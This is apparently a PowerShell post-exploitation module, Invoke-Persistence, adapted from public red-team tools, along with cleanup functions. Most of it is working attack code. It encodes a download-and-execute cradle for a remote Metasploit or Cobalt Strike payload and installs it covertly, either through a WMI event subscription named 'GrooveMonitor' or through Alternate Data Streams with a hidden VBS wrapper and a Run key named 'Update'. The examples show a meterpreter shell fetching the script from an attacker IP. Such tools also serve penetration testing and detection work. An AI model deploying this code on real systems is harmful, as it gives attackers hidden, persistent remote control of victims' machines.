function Invoke-Persistence{
<#
.SYNOPSIS
Powershell Script that will use Alternate Data Streams to achieve persistence
.DESCRIPTION
This script is a modification of the Invoke-ADSBackdoor script by @enigma0x3. It basically takes in a URL payload generated by 
metasploit or cobalt strike stored on your webserver. It used two methods to achieve persistence. If its run with admin privileges 
it leverages WMI persistence, if run without it creates a payload by using two Alternate Data Streams. The first Alternate Data 
stream stores the payload and the second Alternate Data Stream stores some VBScript that acts as a wrapper in order to hide the 
DOS prompt when invoking the data stream containing the payload. When passing the arguments, you have to include the function and 
any parameters required by your payload.
.EXAMPLE
PS C:\Users\test\Desktop> Import-Module .\Invoke-Persistence.ps1
PS C:\Users\test\Desktop> Invoke-Persistence -URL http://192.168.83.175/rev_https.ps1
.EXAMPLE
meterpreter > shell
Process 2140 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\users\test>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Invoke-Persistence -URL http://192.168.83.175/rev_https.ps1
powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Invoke-Persistence -URL http://192.168.83.175/rev_https.ps1
C:\users\test>

#>	
	[CmdletBinding()] 
	Param(
        [Parameter(Mandatory = $True)]
        [String]
        $URL
    )

    $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
    $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
    #$textFile = "test.txt"
	$VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
    $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
	#$vbsFile = "persist.vbs"
	
    #Store Payload
    $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL'))"
    #$payloadParameters = Get-Content $ScriptPath
	$encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
    $payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"
	
	
	$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
    
	# Check if running as admin
	if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
    {
        Get-WmiObject __eventFilter -namespace root\subscription -filter "name='GrooveMonitor'"| Remove-WmiObject
		Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='GrooveMonitor'" | Remove-WmiObject
		Get-WmiObject ActiveScriptEventConsumer -Namespace root\subscription -filter "name='GrooveMonitor'" | Remove-WmiObject
		Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'GrooveMonitor'} | Remove-WmiObject

        #$ExecutablePath  = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
		$CommandLineTemplate ="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -win hidden -noni -enc $encodedPayload"
        $filterNS = "root\cimv2"
        $wmiNS = "root\subscription"
        $query = @"
            SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
"@
        $filterName = "GrooveMonitor"
        $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
        $consumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace $wmiNS -Arguments @{name="GrooveMonitor"; RunInteractively = "false"; CommandLineTemplate =$CommandLineTemplate}
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null		

		}
	else{
	    
	#Store VBS Wrapper
    $vbstext1 = "Dim objShell"
    $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""
    $vbstext4 = "objShell.Run command, 0"
    $vbstext5 = "Set objShell = Nothing"
    $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5

    #Create Alternate Data Streams for Payload and Wrapper
    $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
    $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
    Invoke-Command -ScriptBlock $CreatePayloadADS
    "Payload stored in $env:USERPROFILE\AppData:$textFile"
    Invoke-Command -ScriptBlock $CreateWrapperADS
    "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
	
	#Persist in Registry
    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
	}
}


function Remove-ADS {
<#
.SYNOPSIS
Removes an alterate data stream from a specified location.
P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
Author: @harmj0y, @mattifestation
License: BSD 3-Clause
.LINK
https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]
        [string]$ADSPath
    )
 
    #region define P/Invoke types dynamically
    #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
 
    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))
 
    # Define [Win32.Kernel32]::DeleteFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([String]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    
    $Kernel32 = $TypeBuilder.CreateType()
    
    $Result = $Kernel32::DeleteFile($ADSPath)

    if ($Result){
        Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
    }
    else{
        Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
    }

    $Result
}


function Remove-Persistence
{
<#
.SYNOPSIS
Script which could be used to clear the persistence added by Invoke-Persistence.

.DESCRIPTION
This script cleans WMI events and Registry keys added by various payloads and Add-persistence script.
Run the script as an Administrator to remove the WMI events.

.Example
PS > Remove-Persistence

Check for Persistence.

.Example
PS > Remove-Persistence -Remove

Remove the Persistence.

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
#>
    [CmdletBinding()] Param( 
        [Parameter(Position = 0)]
        [Switch]
        $Remove
    )
    
    if ($Remove -eq $true)
    {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
        {    
            Write-Warning "Run the Command as an Administrator. Removing Registry keys only."
            Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
            Break
        }
		
        Write-Output "Checking for existence of WMI Persistence"
        $filterName = "GrooveMonitor"
        if ((gwmi __eventFilter -namespace root\subscription -filter "name='GrooveMonitor'") -ne $null)
		{
			Write-Output "Removing WMI Persistence"
			gwmi __eventFilter -namespace root\subscription -filter "name='GrooveMonitor'"| Remove-WmiObject
			gwmi CommandLineEventConsumer -Namespace root\subscription | Remove-WmiObject
			gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='GrooveMonitor'"""  | Remove-WmiObject
			Write-Output "Removing the ADS Backdoor"
		}
		else {
			Write-Output "No WMI Persistence Found"
		}
		# get the VBS trigger command/file location from the registry
		$Regkey = Get-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -name Update -ErrorAction SilentlyContinue
		if ($Regkey -ne $null ) 
		{
		Write-Output "Removing RegKey Persistence"
		$trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
		$vbsFile = $trigger.split(" ")[1]
		$getWrapperADS = {cmd /C "more <  $vbsFile"}
		$wrapper = Invoke-Command -ScriptBlock $getWrapperADS

		if ($wrapper -match 'i in \((.+?)\)')
		{
			# extract out the payload .txt file location
			$textFile = $matches[1]
			if($( Remove-ADS $textFile)){
				"Successfully removed payload file $textFile"
			}
			else{
				"[!] Error in removing payload file $textFile"
			}
			
		}
		else{
			"[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile"
		}

		if($(Remove-ADS $vbsFile)){
			"Successfully removed wrapper file $vbsFile"
		}
		else{
			 "[!] Error in removing payload file $textFile"
		}
        Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
		Write-Output "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'Update' key"
		}
		else
		{
			Write-Output "No RegKey Persistence Found"
		}
    }
	else 
	{
		$Regkey = Get-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -name Update -ErrorAction SilentlyContinue
		$wmi_1 = gwmi __eventFilter -namespace root\subscription -filter "name='GrooveMonitor'"
		$wmi_2 = gwmi CommandLineEventConsumer -Namespace root\subscription
		$wmi_3 = gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='GrooveMonitor'"""
		if ($Regkey -ne $null )
		{
			Write-Warning "Run Registry key persistence found. Use with -Remove option to clean."
		}
		if (($wmi_1) -and ($wmi_2) -and ($wmi_3) -ne $null)    
		{
			Write-Warning "WMI permanent event consumer persistence found. Use with -Remove option to clean."
		}
		if (($Regkey -eq $null ) -and (($wmi_1) -and ($wmi_2) -and ($wmi_3) -eq $null))
		{
			Write-Output "No Persistence found."
		}
	}
}